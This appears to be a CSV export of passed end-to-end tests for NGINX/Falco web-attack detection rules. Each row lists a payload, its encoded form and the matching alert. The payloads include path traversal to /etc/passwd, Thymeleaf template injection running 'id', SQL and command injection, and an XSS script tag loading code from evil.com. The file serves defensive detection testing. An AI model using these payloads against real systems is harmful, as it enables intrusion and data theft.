"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_BOLA_003` |
| **Name** | BOLA Admin User Profile Access |
| **Category** | API_SECURITY |
| **Subcategory** | bola |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/api/admin/users/100/profile`
- **Encoded**: `%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 14:45:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1770821134850-tzb5i9 pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1770821134850-tzb5i9 pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1

**Falco Log Entry**:
```
14:45:34.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1770821134850-tzb5i9 pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1
```","2","test_e2e_with_logs[399_API_BOLA_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_NORM_002` |
| **Name** | Mixed slashes bypass |
| **Category** | PATH |
| **Subcategory** | normalization |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../..\../etc/passwd`
- **Encoded**: `..%2F..%5C..%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 14:45:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_002-1770821105885-swx0u pattern_id=PATH_NORM_002 uri=/?q=..%2F..%5C..%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_002-1770821105885-swx0u pattern_id=PATH_NORM_002 uri=/?q=..%2F..%5C..%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:45:05.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_002-1770821105885-swx0u pattern_id=PATH_NORM_002 uri=/?q=..%2F..%5C..%2Fetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[252_PATH_NORM_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_THYME_001` |
| **Name** | Thymeleaf expression injection |
| **Category** | SSTI |
| **Subcategory** | thymeleaf |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `__${T(java.lang.Runtime).getRuntime().exec(""id"")}__`
- **Encoded**: `__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 14:45:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Spring4Shell attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1770821121843-ymrml pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1770821121843-ymrml pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1

**Falco Log Entry**:
```
14:45:21.000000000: Critical [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_THYME_001-1770821121843-ymrml pattern_id=SSTI_THYME_001 uri=/?q=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__ client=127.0.0.1
```","2","test_e2e_with_logs[517_SSTI_THYME_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_013` |
| **Name** | onmouseover event handler injection |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<a onmouseover=alert(1)>hover</a>`
- **Encoded**: `%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 14:44:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770821085351-i8z6c8 pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770821085351-i8z6c8 pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:44:45.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770821085351-i8z6c8 pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[198_XSS_REFL_013]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_003` |
| **Name** | Full-width dot traversal |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `％２ｅ％２ｅ/etc/passwd`
- **Encoded**: `%EF%BC%85%EF%BC%92%EF%BD%85%EF%BC%85%EF%BC%92%EF%BD%85%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~42000ms
- **Timestamp**: 14:45:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_003-1770821116912-terivc pattern_id=PATH_UNI_003 uri=/?q=%EF%BC%85%EF%BC%92%EF%BD%85%EF%BC%85%EF%BC%92%EF%BD%85%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_003-1770821116912-terivc pattern_id=PATH_UNI_003 uri=/?q=%EF%BC%85%EF%BC%92%EF%BD%85%EF%BC%85%EF%BC%92%EF%BD%85%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:45:16.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_003-1770821116912-terivc pattern_id=PATH_UNI_003 uri=/?q=%EF%BC%85%EF%BC%92%EF%BD%85%EF%BC%85%EF%BC%92%EF%BD%85%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[262_PATH_UNI_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_COUCH_001` |
| **Name** | CouchDB all documents disclosure |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | couchdb |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `_all_docs?include_docs=true`
- **Encoded**: `_all_docs%3Finclude_docs%3Dtrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 14:45:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_COUCH_001-1770821124335-0j0uy pattern_id=NOSQL_COUCH_001 uri=/?q=_all_docs%3Finclude_docs%3Dtrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_COUCH_001-1770821124335-0j0uy pattern_id=NOSQL_COUCH_001 uri=/?q=_all_docs%3Finclude_docs%3Dtrue client=127.0.0.1

**Falco Log Entry**:
```
14:45:24.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_COUCH_001-1770821124335-0j0uy pattern_id=NOSQL_COUCH_001 uri=/?q=_all_docs%3Finclude_docs%3Dtrue client=127.0.0.1
```","2","test_e2e_with_logs[413_NOSQL_COUCH_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_BLIND_001` |
| **Name** | XPath substring blind injection |
| **Category** | XPATH |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' or substring(//user[1]/password,1,1)='a' or '1'='2`
- **Encoded**: `%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 14:45:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1770821115840-dbmap7 pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1770821115840-dbmap7 pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1

**Falco Log Entry**:
```
14:45:15.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1770821115840-dbmap7 pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1
```","2","test_e2e_with_logs[389_XPATH_BLIND_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_002` |
| **Name** | AND operator with whoami |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& whoami`
- **Encoded**: `%26%26%20whoami`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 14:44:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1770821089839-o5zbh pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1770821089839-o5zbh pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1

**Falco Log Entry**:
```
14:44:49.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1770821089839-o5zbh pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1
```","2","test_e2e_with_logs[301_CMD_BASIC_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_005` |
| **Name** | Polyglot script src |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'><script src=//evil.com/x.js></script>`
- **Encoded**: `'%3E%3Cscript%20src%3D%2F%2Fevil.com%2Fx.js%3E%3C%2Fscript%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 14:45:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_005-1770821105897-ews3m pattern_id=XSS_POLY_005 uri=/?q='%3E%3Cscript%20src%3D%2F%2Fevil.com%2Fx.js%3E%3C%2Fscript%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_005-1770821105897-ews3m pattern_id=XSS_POLY_005 uri=/?q='%3E%3Cscript%20src%3D%2F%2Fevil.com%2Fx.js%3E%3C%2Fscript%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:05.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_005-1770821105897-ews3m pattern_id=XSS_POLY_005 uri=/?q='%3E%3Cscript%20src%3D%2F%2Fevil.com%2Fx.js%3E%3C%2Fscript%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[180_XSS_POLY_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_006` |
| **Name** | Pipe character bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'||UNION||SELECT||version(),NULL,NULL--`
- **Encoded**: `'%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 14:45:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_006-1770821103902-2v9ebk pattern_id=SQLI_BYPASS_006 uri=/?q='%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_006-1770821103902-2v9ebk pattern_id=SQLI_BYPASS_006 uri=/?q='%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:03.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_006-1770821103902-2v9ebk pattern_id=SQLI_BYPASS_006 uri=/?q='%7C%7CUNION%7C%7CSELECT%7C%7Cversion()%2CNULL%2CNULL-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[055_SQLI_BYPASS_006]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_010` |
| **Name** | URL encoded extended sleep |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP%2810%29`
- **Encoded**: `SLEEP%252810%2529`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~80000ms
- **Timestamp**: 14:44:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1770821078847-5c0k2p pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1770821078847-5c0k2p pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:44:38.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1770821078847-5c0k2p pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[105_SQLI_TIME_010]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PP_BASIC_003` |
| **Name** | __proto__ with role escalation |
| **Category** | PROTOTYPE_POLLUTION |
| **Subcategory** | basic |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `?__proto__[role]=admin`
- **Encoded**: `%3F__proto__%5Brole%5D%3Dadmin`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~18000ms
- **Timestamp**: 14:45:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX PP] Prototype pollution attack attempt` |
| **Matched Rule** | `[NGINX PP] Prototype pollution attack attempt test_id=PP_BASIC_003-1770821140337-69a8rq pattern_id=PP_BASIC_003 uri=/?q=%3F__proto__%5Brole%5D%3Dadmin client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX PP] Prototype pollution attack attempt test_id=PP_BASIC_003-1770821140337-69a8rq pattern_id=PP_BASIC_003 uri=/?q=%3F__proto__%5Brole%5D%3Dadmin client=127.0.0.1

**Falco Log Entry**:
```
14:45:40.000000000: Warning [NGINX PP] Prototype pollution attack attempt test_id=PP_BASIC_003-1770821140337-69a8rq pattern_id=PP_BASIC_003 uri=/?q=%3F__proto__%5Brole%5D%3Dadmin client=127.0.0.1
```","1","test_e2e_with_logs[383_PP_BASIC_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_013` |
| **Name** | PostgreSQL generate_series resource exhaustion |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT * FROM generate_series(1,1000000)) --`
- **Encoded**: `%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 14:45:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_013-1770821124950-ew7qx pattern_id=SQLI_ERROR_013 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_013-1770821124950-ew7qx pattern_id=SQLI_ERROR_013 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:24.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_013-1770821124950-ew7qx pattern_id=SQLI_ERROR_013 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[074_SQLI_ERROR_013]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_NORM_001` |
| **Name** | Backslash normalization bypass |
| **Category** | PATH |
| **Subcategory** | normalization |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\..\..\etc\passwd`
- **Encoded**: `..%5C..%5C..%5Cetc%5Cpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 14:45:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_001-1770821105384-c10155 pattern_id=PATH_NORM_001 uri=/?q=..%5C..%5C..%5Cetc%5Cpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_001-1770821105384-c10155 pattern_id=PATH_NORM_001 uri=/?q=..%5C..%5C..%5Cetc%5Cpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:45:05.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_001-1770821105384-c10155 pattern_id=PATH_NORM_001 uri=/?q=..%5C..%5C..%5Cetc%5Cpasswd client=127.0.0.1
```","1","test_e2e_with_logs[251_PATH_NORM_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_001` |
| **Name** | Basic script tag XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<script>alert('XSS')</script>`
- **Encoded**: `%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 14:44:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1770821079335-0jzhot pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1770821079335-0jzhot pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:44:39.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1770821079335-0jzhot pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[186_XSS_REFL_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_WIN_002` |
| **Name** | Windows double backslash traversal |
| **Category** | PATH |
| **Subcategory** | windows_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\..\`
- **Encoded**: `..%5C..%5C`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 14:44:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_002-1770821099871-kwdyve pattern_id=PATH_WIN_002 uri=/?q=..%5C..%5C client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_002-1770821099871-kwdyve pattern_id=PATH_WIN_002 uri=/?q=..%5C..%5C client=127.0.0.1

**Falco Log Entry**:
```
14:44:59.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_002-1770821099871-kwdyve pattern_id=PATH_WIN_002 uri=/?q=..%5C..%5C client=127.0.0.1
```","2","test_e2e_with_logs[275_PATH_WIN_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_055` |
| **Name** | Double URL Encoding |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%252e%252e%252f`
- **Encoded**: `%252e%252e%252f`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 14:45:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_055-1770821111399-xvf4t pattern_id=PATH_ADV_055 uri=/?q=%252e%252e%252f client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_055-1770821111399-xvf4t pattern_id=PATH_ADV_055 uri=/?q=%252e%252e%252f client=127.0.0.1

**Falco Log Entry**:
```
14:45:11.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ADV_055-1770821111399-xvf4t pattern_id=PATH_ADV_055 uri=/?q=%252e%252e%252f client=127.0.0.1
```","2","test_e2e_with_logs[225_PATH_ADV_055]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
